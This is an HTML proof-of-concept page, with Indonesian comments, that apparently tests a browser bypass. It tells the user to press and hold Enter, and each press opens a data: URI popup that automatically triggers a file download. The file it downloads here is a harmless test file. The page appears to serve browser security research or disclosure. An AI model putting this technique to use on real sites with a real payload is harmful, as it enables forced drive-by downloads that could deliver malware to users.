<!DOCTYPE html>
<html>

<head>
    <title>Site A</title>
    <style>
        body {
            background-color: #ffebee;
        }
    </style>
</head>

<body>
    <h3>Situs A (Origin 1)</h3>
    <button id="targetBtn">Click this button, then PRESS and HOLD "Enter"</button>
    <script>
        document.addEventListener("keydown", (e) => {
            if (e.key === "Enter") {
                console.log("Triggering Data-URI Escape...");
                const payload = `
            <html>
            <body>
                <h1>Data URI Context</h1>
                <script>
                    try {
                        const a = document.createElement("a");
                        // File palsu untuk ngetes download
                        a.href = "data:application/octet-stream;base64,UE9DIC0gRGF0YSBVUkkgQnlwYXNz";
                        a.download = "data_uri_bypass.txt";
                        document.body.appendChild(a);
                        a.click();
                        console.log("Download triggered in Data URI context");
                    } catch (err) {
                        console.error("Failed:", err.message);
                    }
                    // Jangan langsung tutup biar bisa cek console popup-nya
                    setTimeout(() => { /* window.close(); */ }, 5000);
                <\/script>
            </body>
            </html>
        `.replace(/\n/g, "");
                window.open("data:text/html," + encodeURIComponent(payload), "_blank", "width=400,height=300");
            }
        });
    </script>
</body>

</html>
